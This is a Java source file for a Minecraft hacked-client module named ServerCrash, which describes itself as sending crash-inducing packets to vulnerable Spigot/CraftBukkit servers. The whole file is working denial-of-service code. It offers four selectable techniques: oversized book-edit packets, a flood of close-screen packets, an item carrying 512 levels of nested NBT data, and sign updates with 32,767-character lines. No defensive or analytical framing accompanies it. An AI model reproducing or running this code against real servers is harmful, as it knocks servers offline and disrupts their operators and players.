package com.claudemc.module.impl.misc;

import com.claudemc.ClaudeMCMod;
import com.claudemc.module.Category;
import com.claudemc.module.Module;
import net.minecraft.client.MinecraftClient;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.util.math.BlockPos;

import java.util.Collections;
import java.util.List;
import java.util.Optional;

public class ServerCrash extends Module {

    public ServerCrash() {
        super("ServerCrash",
              "Sends crash-inducing packets to vulnerable servers (Spigot/CB, unpatched)",
              Category.MISC);
        addSetting("Technique", "BookOverflow");
        addSetting("Packets",   "20");
    }

    @Override
    public void onEnable() {
        var client = MinecraftClient.getInstance();
        if (client.player == null || client.getNetworkHandler() == null) return;

        String tech = getSetting("Technique");
        int count   = parseInt(getSetting("Packets"), 20);

        switch (tech) {
            case "BookOverflow" -> doBookOverflow(client);
            case "PacketFlood"  -> doPacketFlood(client, count);
            case "NBTOverflow"  -> doNBTOverflow(client);
            case "SignOverflow" -> doSignOverflow(client);
        }

        setEnabled(false);
    }

    @Override public void onTick(MinecraftClient client) {}

    private void doBookOverflow(MinecraftClient client) {
        try {
            String maxPage = "A".repeat(32767);
            List<String> pages = Collections.nCopies(100, maxPage);
            int count = parseInt(getSetting("Packets"), 1);
            for (int i = 0; i < count; i++) {
                client.getNetworkHandler().sendPacket(
                    new BookUpdateC2SPacket(0, pages, Optional.empty()));
            }
            ClaudeMCMod.LOGGER.info("[ServerCrash][BookOverflow] Sent {} book packets.", count);
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ServerCrash][BookOverflow] {}", e.getMessage());
        }
    }

    private void doPacketFlood(MinecraftClient client, int count) {
        try {
            for (int i = 0; i < count; i++) {
                client.getNetworkHandler().sendPacket(new CloseHandledScreenC2SPacket(i % 127));
            }
            ClaudeMCMod.LOGGER.info("[ServerCrash][PacketFlood] Sent {} close packets.", count);
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ServerCrash][PacketFlood] {}", e.getMessage());
        }
    }

    private void doNBTOverflow(MinecraftClient client) {
        try {
            NbtCompound root = new NbtCompound();
            NbtCompound current = root;
            for (int i = 0; i < 512; i++) {
                NbtCompound child = new NbtCompound();
                current.put("n", child);
                current = child;
            }
            var stack = new ItemStack(Items.WRITTEN_BOOK);
            stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(root));
            client.getNetworkHandler().sendPacket(
                new CreativeInventoryActionC2SPacket(36, stack));
            ClaudeMCMod.LOGGER.info("[ServerCrash][NBTOverflow] Sent deep NBT packet.");
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ServerCrash][NBTOverflow] {}", e.getMessage());
        }
    }

    private void doSignOverflow(MinecraftClient client) {
        try {
            String line = "X".repeat(32767);
            BlockPos pos = client.player.getBlockPos().down();
            client.getNetworkHandler().sendPacket(
                new UpdateSignC2SPacket(pos, true, line, line, line, line));
            ClaudeMCMod.LOGGER.info("[ServerCrash][SignOverflow] Sent sign overflow packet.");
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ServerCrash][SignOverflow] {}", e.getMessage());
        }
    }

    private int parseInt(String s, int fallback) {
        try { return Integer.parseInt(s); } catch (NumberFormatException e) { return fallback; }
    }
}
